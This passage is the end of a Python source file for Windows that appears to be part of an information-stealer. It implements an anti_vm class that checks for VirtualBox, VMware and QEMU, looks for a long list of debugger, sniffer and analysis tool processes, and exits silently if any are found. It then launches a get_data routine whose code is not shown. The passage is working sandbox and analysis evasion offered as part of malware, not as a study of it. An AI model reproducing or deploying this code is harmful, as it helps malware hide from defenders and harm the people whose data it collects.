                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as Error:
            logs_handler(f"[ERROR] - virtual memory detected: {str(Error)}")

    async def check_for_virtualization(self) -> None:
        try:
            process = await asyncio.create_subprocess_shell('wmic path win32_VideoController get name',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout, stderr = await process.communicate()
            video_controller_info = stdout.decode(errors='ignore').splitlines()
            if any(x.lower() in video_controller_info[2].strip().lower() for x in ("virtualbox", "vmware")):
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as Error:
            logs_handler(f"[ERROR] - virtual machine detected: {str(Error)}")

    async def check_for_suspicious_files(self) -> None:
        try:
            temp_file_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'JSAMSIProvider64.dll')
            if os.path.exists(temp_file_path):
                ctypes.windll.kernel32.ExitProcess(0)
            try:
                machine_name = platform.uname().machine.lower()
                if "dady harddisk" in machine_name or "qemu harddisk" in machine_name:
                    ctypes.windll.kernel32.ExitProcess(0)
            except AttributeError:
                pass

            suspicious_process_names = ["32dbg", "64dbgx", "autoruns", "autoruns64", "autorunsc", "autorunsc64", "ciscodump", "df5serv", "die", "dumpcap", "efsdump", "etwdump", "fakenet", "fiddler", "filemon", "hookexplorer", "httpdebugger", "httpdebuggerui", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idau", "idau64", "idaw", "immunitydebugger", "importrec", "joeboxcontrol", "joeboxserver", "ksdumperclient", "lordpe", "ollydbg", "pestudio", "petools", "portmon", "prl_cc", "prl_tools", "proc_analyzer", "processhacker", "procexp", "procexp64", "procmon", "procmon64", "qemu-ga", "qga", "regmon", "reshacker", "resourcehacker", "sandman", "sbiesvc", "scylla", "scylla_x64", "scylla_x86", "sniff_hit", "sysanalyzer", "sysinspector", "sysmon", "tcpdump", "tcpview", "tcpview64", "udpdump", "vboxcontrol", "vboxservice", "vboxtray", "vgauthservice", "vm3dservice", "vmacthlp", "vmsrvc", "vmtoolsd", "vmusrvc", "vmwaretray", "vmwareuser", "vt-windows-event-stream", "windbg", "wireshark", "x32dbg", "x64dbg", "x96dbg", "xenservice"]
          
            running_processes = [
                process.name().lower() for process in psutil.process_iter(attrs=['name']) 
                if process.name().lower() in suspicious_process_names
            ]
            if running_processes:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as Error:
            logs_handler(f"[ERROR] suspicious files detected: {str(Error)}")

    async def check_system_manufacturer(self) -> None:
        try:
            process1 = await asyncio.create_subprocess_shell('wmic computersystem get Manufacturer',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout1, stderr1 = await process1.communicate()

            process2 = await asyncio.create_subprocess_shell('wmic path Win32_ComputerSystem get Manufacturer',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout2, stderr2 = await process2.communicate()

            if b'VMware' in stdout1 or b"vmware" in stdout2.lower():
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as Error:
            logs_handler(f"[ERROR] - vm manufacturer detected: {str(Error)}")
        
if __name__ == '__main__':
    if os.name == "nt":
        anti = anti_vm()
        asyncio.run(anti.run_all_fonctions())

        main = get_data()
        asyncio.run(main.RunAllFonctions())
    else:
        print('run only on windows operating system')